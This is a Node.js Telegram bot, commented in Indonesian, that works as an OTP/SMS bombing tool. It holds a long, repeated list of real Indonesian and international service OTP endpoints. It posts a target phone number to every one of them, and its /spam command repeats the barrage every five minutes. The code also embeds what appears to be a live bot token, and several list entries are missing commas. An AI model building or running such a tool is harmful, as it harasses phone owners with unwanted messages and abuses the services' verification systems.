const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const moment = require('moment-timezone');
const cron = require('node-cron');

// Konfigurasi Bot
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, {polling: true});

// Daftar API OTP
const otpApis = [
  'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
    'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
 'https://www.citcall.com/demo/misscallapi.php',
'https://wapi.ruparupa.com/auth/check-otp-auth',
'https://www.citcall.com/demo/misscallapi.php' ,
'https://wapi.ruparupa.com/auth/generate-otp' ,
'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id' ,
'https://www.tokocash.com/oauth/otp' ,
'https://www.citcall.com/demo/misscallapi.php' ,
'https://accounts.tokopedia.com/otp/c/ajax/request-wa' ,
'https://www.citcall.com/demo/misscallapi.php' ,
'https://core.ktbs.io/v2/user/registration/otp/' ,
'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp' ,
'https://www.citcall.com/demo/misscallapi.php' ,
'https://api.danafix.id/mob/client/verification/send' ,
'https://www.citcall.com/demo/misscallapi.php' ,
'https://api.jumpstart.id/graphql' ,
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
    'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
    'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
    'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
    'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
    'https://u.icq.net/api/v14/rapi/auth/sendCode',
  'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://wapi.ruparupa.com/auth/check-otp-auth',
  'https://wapi.ruparupa.com/auth/generate-otp',
  'https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id',
  'https://www.tokocash.com/oauth/otp',
  'https://accounts.tokopedia.com/otp/c/ajax/request-wa',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://core.ktbs.io/v2/user/registration/otp/',
  'https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp',
  'https://api.danafix.id/mob/client/verification/send',
  'https://api.jumpstart.id/graphql',
  'https://p.grabtaxi.com/api/passenger/v2/profiles/register',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.olx.co.id/api/auth/authenticate',
  'https://app-api.kredito.id/client/v1/common/verify-code/send',
  'https://api.gojekapi.com/v5/customers',
  'https://api.tokko.io/graphql',
  'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
  'https://api-sms-v2.herokuapp.com/tiki?',
  'https://nuubi.herokuapp.com/api/spam/klikdok',
  'https://global-api.mpl.live/auth/init/otp',
  'https://tokomanamana.com/ma/auth/request_token_merchant/',
  'https://api-sms-v2.herokuapp.com/gojoy',
  'https://shopee.co.id/api/v4/otp/send_vcode',
  'https://webapi.depop.com/api/auth/v1/verify/phone',
  'https://api-sms-v2.herokuapp.com/vntrip',
  'https://registrasi.tri.co.id/daftar/generateOTP',
  'https://www.blibli.com/backend/common/users/_request-otp',
  'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
  'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
  'https://api.btpn.com/jenius',
  'https://m.misteraladin.com/api/members/v2/otp/request',
  'https://api.kredinesia.id/v1/login/verificationCode',
  'https://api-sms-v2.herokuapp.com/grab-food?',
  'https://www.sayurbox.com/graphql/v1?deduplicate=1',
  'https://apiv2.jamtangan.com/validateuniqueid',
  'https://id.jagreward.com/member/verify-mobile/',
  'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn',
  'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID',
  'https://bos.smartlink.id/checkRegister',
  'https://m.bukalapak.com/trusted_devices/otp_request',
  'https://www.citcall.com/demo/misscallapi.php',
  'https://www.citcall.com/demo/misscallapi.php'
  'https://api.tix.id:443/v1/otp/send_otp',
  'https://api.ovo.id/v2.0/api/auth/customer/login2FA',
  'https://app.candireload.com/apps/v8/users/req_otp_register_wa',
  'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=',
  'https://sofia.bmsecure.id/central-api/oauth/token',
  'https://sofia.bmsecure.id/central-api/sc-api/otp/generate',
  'https://keranjangbelanja.co.id/api/v1/user/otp',
  'https://titipku.tech/v1/mobile/auth/otp?method=wa'
];

// Fungsi untuk mendapatkan waktu sekarang
function getCurrentTime() {
  return moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
}

// Fungsi untuk mengirim OTP
async function sendOTP(phoneNumber) {
  const results = [];
  
  for (const apiUrl of otpApis) {
    try {
      const startTime = Date.now();
      const response = await axios.post(apiUrl, {
        phone: phoneNumber
      }, {
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
      });
      
      const endTime = Date.now();
      const duration = (endTime - startTime) / 1000;
      
      results.push({
        api: apiUrl,
        status: 'Success',
        response: response.data,
        duration: `${duration}s`
      });
    } catch (error) {
      results.push({
        api: apiUrl,
        status: 'Failed',
        error: error.message
      });
    }
  }
  
  return results;
}

// Command handler
bot.onText(/\/mulai/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      keyboard: [[{ text: 'Kirim Nomor +62' }]],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  };
  bot.sendMessage(chatId, 'Silakan klik tombol "Kirim Nomor +62" untuk memulai.', options);
});

bot.onText(/Kirim Nomor \+62/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Silakan kirim nomor telepon dengan format +62xxxxxxxxxxx');
});

bot.onText(/\+62\d+/, async (msg) => {
  const chatId = msg.chat.id;
  const phoneNumber = msg.text;
  
  bot.sendMessage(chatId, `Memulai mengirim OTP ke ${phoneNumber}...\nWaktu: ${getCurrentTime()}`);
  
  const results = await sendOTP(phoneNumber);
  
  let successCount = 0;
  let failedCount = 0;
  
  let report = `Laporan Pengiriman OTP ke ${phoneNumber}\n`;
  report += `Waktu: ${getCurrentTime()}\n\n`;
  
  for (const result of results) {
    if (result.status === 'Success') {
      successCount++;
      report += `✅ ${result.api}\nStatus: ${result.status}\nDurasi: ${result.duration}\n\n`;
    } else {
      failedCount++;
      report += `❌ ${result.api}\nStatus: ${result.status}\nError: ${result.error}\n\n`;
    }
  }
  
  report += `Total: ${otpApis.length} API\nBerhasil: ${successCount}\nGagal: ${failedCount}`;
  
  bot.sendMessage(chatId, report);
});

bot.onText(/\/spam (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const phoneNumber = match[1];
  
  if (!phoneNumber.startsWith('+62')) {
    bot.sendMessage(chatId, 'Format nomor salah. Gunakan format +62xxxxxxxxxxx');
    return;
  }
  
  bot.sendMessage(chatId, `Memulai spam OTP ke ${phoneNumber}...\nWaktu: ${getCurrentTime()}`);
  
  // Jadwalkan pengiriman setiap 5 menit
  const task = cron.schedule('*/5 * * * *', async () => {
    const results = await sendOTP(phoneNumber);
    let successCount = results.filter(r => r.status === 'Success').length;
    bot.sendMessage(chatId, `Spam berhasil dikirim ke ${successCount} API\nWaktu: ${getCurrentTime()}`);
  });
  
  // Simpan task untuk dihentikan nanti
  bot.onText(/\/stopspam/, (msg) => {
    if (msg.chat.id === chatId) {
      task.stop();
      bot.sendMessage(chatId, 'Spam dihentikan.');
    }
  });
});

bot.onText(/\/tutor/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Tutorial YouTube: https://youtube.com/yourchannel');
});

bot.onText(/\/yt/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Subscribe channel saya: https://youtube.com/yourchannel');
});

bot.onText(/\/tiktok/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Follow TikTok saya: https://tiktok.com/@yourusername');
});

bot.onText(/\/donasi/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Donasi bisa ke:\n- Dana: 081234567890\n- OVO: 081234567890\n- GOPAY: 081234567890');
});

bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  const helpText = `
  Daftar Perintah:
  /mulai - Mulai bot
  /spam +62xxxx - Spam OTP ke nomor
  /stopspam - Hentikan spam
  /tutor - Tutorial YouTube
  /yt - Subscribe YouTube
  /tiktok - Follow TikTok
  /donasi - Donasi
  /help - Bantuan
  `;
  bot.sendMessage(chatId, helpText);
});

// Menjaga bot tetap online
console.log('Bot is running...');
setInterval(() => {
  console.log(`Bot masih aktif - ${getCurrentTime()}`);
}, 3600000); // Log setiap jam
